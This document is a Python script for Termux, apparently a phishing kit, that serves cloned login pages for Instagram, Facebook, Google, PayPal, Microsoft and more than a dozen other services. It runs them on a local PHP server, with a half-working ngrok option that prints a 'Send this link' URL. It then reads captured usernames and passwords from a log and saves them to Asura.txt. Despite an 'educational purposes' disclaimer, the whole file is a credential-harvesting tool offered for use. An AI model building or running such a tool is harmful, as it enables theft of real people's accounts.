#!/data/data/com.termux/files/usr/bin/python3
#@Author prince kumar 
# Date 12 jan 2020
# this script is only for educational purposes
#Import all requirements----------------------
import sys
import os
import re
import time
import random
import subprocess
#Try to import error
try:
    os.system("clear")
    import requests
except ImportError:
    print("Import requests module \n pip3 install requests")
except KeyboardInterrupt:
    print("[!] Exiting Ravana")
    sys.exit()


#Define some color code-----------------------
r ='\033[31;1m'
g ="\033[32;1m"
o ="\033[33;1m"
pu ="\033[35;1m"
c ="\033[36;1m"
y ="\033[93;1m"
w ="\033[0;1m"
p ="\033[95;1m"
#Color coding end here
# Make a banner function here-------------------
def banner():
    print(f"""{g}
             

                                               
             @@@         @@@       
          @@                 @@    
        @@    @@         @@    @@  
       @@@  @@             @@  @@@ 
      @@@  @@       {y}@{g}       @@  @@@
      @@@@@@@       {y}@{g}       @@@@@@@
      @@@@ @@@      {y}@{g}      @@@ @@@@
       @@@@@@@@@    {y}@{g}    @@@@@@@@@ 
        @@@@@@@@@@ {y}@@@{g} @@@@@@@@@@  
          @@@@@@@  {y}@@@{g}  @@@@@@@    
             @@@@  {y}@@@{g}  @@@@       
{pu}   Made by princeWeb{w}: {r} Prince kumar """)
banner()


#Banner making end here-------------------------
#First chekck for interner connection
def internet():
    try:
        res = requests.get("https://google.com")
        if res.status_code == 200:
            print(f"{w}[{c}!{w}] {g} Internet connection found.")
        else:
            print(f"{y}[{r}!{y}] {g} Something went wrong")
    except KeyboardInterrupt:
        print(f"{r}[{c}!{r}] {pu} Exiting ravana-----> ")
        sys.exit()
        time.sleep(2)
    except:
        print(f"{r}[{c}!{r}] {y} Please on your internet connection")

internet()
#Internet function end here
#Make a directory 
def mk_dir():
    try:
        os.makedirs("pweb")
    except FileExistsError:
        print()
    except:
        print(f"{w} ----Someting went wrong------")


mk_dir()
#Dir function end here
#Make a function for user data---------
def user_data(server):
    while True:
        if  os.path.exists(f"pweb/{server}/userlog.txt"):
            print(f"{w}[{g}+{w}] {y} User data found")
            os.system(f"cat pweb/{server}/userlog.txt")
            os.system(f"cat pweb/{server}/userlog.txt >> Asura.txt")
            print()
            print(f"{y}[{g}+{y}] {r} Username and password saved into Asura.txt")
            os.system("rm -rf pweb")
            sys.exit()
        else:
            pass



#Make a function for handling Localhost
def l_host(server):
    path = f"sites/{server}"
    des = "pweb/"
    os.system(f"cp -R {path} {des}")
    print("\n")
    print(f"{r}[{w}~{r}] {g} Select any ")
    print()
    print(f"{y}[{g}01{y}] {r} Localhost--Random--")
    print(f"{y}[{g}02{y}] {r} Localhost--Custom--")
    port_ = random.randint(1150, 9999)
    l_optn = input(f"{y}[{g}~{y}] {w} Choose option: ")
    if l_optn == "1" or l_optn == "01":
        os.system(f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
        print(f"{r}[{w}+{r}] {g} Localhost started on http://127.0.0.1:{port_}")
        user_data(server)
    if l_optn == "2" or l_optn == "02":
        print()
        port_ = int(input(f"{r}[{g}+{r}] {y} Enter a portnumber: "))
        os.system(f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
        print(f"{r}[{w}+{r}] {g} Localhost started on http://127.0.0.1:{port_}")
        user_data(server)
#Make a ngrok host
def ngrok_s(server):
    path = f"sites/{server}"
    des = "pweb/"
    os.system(f"cp -R {path} {des}")
    print("\n")
    port_ = random.randint(1150, 9999)
    os.system(f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
    os.system(f"./ngrok http http://127.0.0.1{port_} > /dev/null 2>&1")
    l_res = requests.get("http://127.0.0.1:4043/api/tunnels")
    yext = re.search("https://[0-9a-z].*\.ngrok.io", l_res.text)
    print("\n")
    print(f"{y}[{g}+{y}] {w} Send this link: ")
    print(yext)





#Asking for link forwoding option
def host_optn(server):
    print("\n")
    print(f"{p}[{g}~{p}] {w} Link generating option")
    print()
    print(f"{w}[{y}01{w}] {g} Localhost")
    print(f"{w}[{y}02{w}] {g} Ngrok--not--available-")
    print()
    h_optn = input(f"{r}[{w}×{r}] {y} Choose option: ")
    if h_optn == "1" or h_optn == "01":
        l_host(server)
    elif h_optn == "2" or h_optn == "02":
        print("Currently Ngrok is not available")
#Make options for websites..
def optn():
    print(f"{y}[{g}01{y}] {c} Instagram     {y}[{g}11{y}] {c} Dropbox ")
    print(f"{y}[{g}02{y}] {c} Facebook      {y}[{g}12{y}] {c} ig_follower ")
    print(f"{y}[{g}03{y}] {c} Google        {y}[{g}13{y}] {c} Yandex ")
    print(f"{y}[{g}04{y}] {c} Twitter       {y}[{g}14{y}] {c} Origin ")
    print(f"{y}[{g}05{y}] {c} Netflix       {y}[{g}15{y}] {c} Ebay  ")
    print(f"{y}[{g}06{y}] {c} Snapchat      {y}[{g}16{y}] {c} Pinetrest ")
    print(f"{y}[{g}07{y}] {c} Yahoo         {y}[{g}17{y}] {c} Linkdin ")
    print(f"{y}[{g}08{y}] {c} Github        {y}[{g}18{y}] {c} Ebay ")
    print(f"{y}[{g}09{y}] {c} Paypal        {y}[{g}19{y}] {c} Microsoft  ")
    print(f"{y}[{g}10{y}] {c} Spotify       {y}[{g}20{y}] {c} About me ")

optn()
#Let's read the user input----------
print("\n")
try:
    optn = input(f"{w}[{g}×{w}] {p} Choose an option: ")
except KeyboardInterrupt:
    print(f"{g}[{y}!{g}] {r} ___Exiting Asura___")
    time.sleep(1)
    sys.exit()
# Make handle for user input----------------
if optn == '1' or optn == '01':
    host_optn("instagram")
elif optn == '2' or optn == '02':
    host_optn("facebook")
elif optn == '3' or optn == '03':                           host_optn("google")
elif optn == '4' or optn == '04':
    host_optn("twitter")
elif optn == '5' or optn == '05':                           host_optn("netflix")
elif optn == '6' or optn == '06':                           host_optn("snapchat")
elif optn == '7' or optn == '07':                           host_optn("yahoo")
elif optn == '8' or optn == '08':                           host_optn("github")
elif optn == '9' or optn == '09':                           host_optn("paypal")
elif optn == '10':
    host_optn("spotify")
elif optn == '11':                                          host_optn("dropbox")
elif optn == '12':                                          host_optn("ig_follower")
elif optn == '13':                                          host_optn("yandex")
elif optn == '14':                                          host_optn("origin")
elif optn == '15':                                          host_optn("ebay")
elif optn == '16':                                          host_optn("pinetrest") 
elif optn == '17':                                          host_optn("linkedin")
elif optn == '18':                                          host_optn("snapchat")
elif optn == '19':                                          host_optn("microsoft")
elif optn == '20':                                          print(f"{y} I am prince kumar and i am a junior mechanical engineer \n{r} Youtube https://m.youtube.com/Princeweb\n{c} Instagram https://instagram.com/sirprincekrvert\n{p} Facebook https://m.facebook.com/Princekrvert") 
else:
    print("\n")
    print(f"{r}[{y}!{r}] {g} Invalid option ")
    time.sleep(1)
    sys.exit()
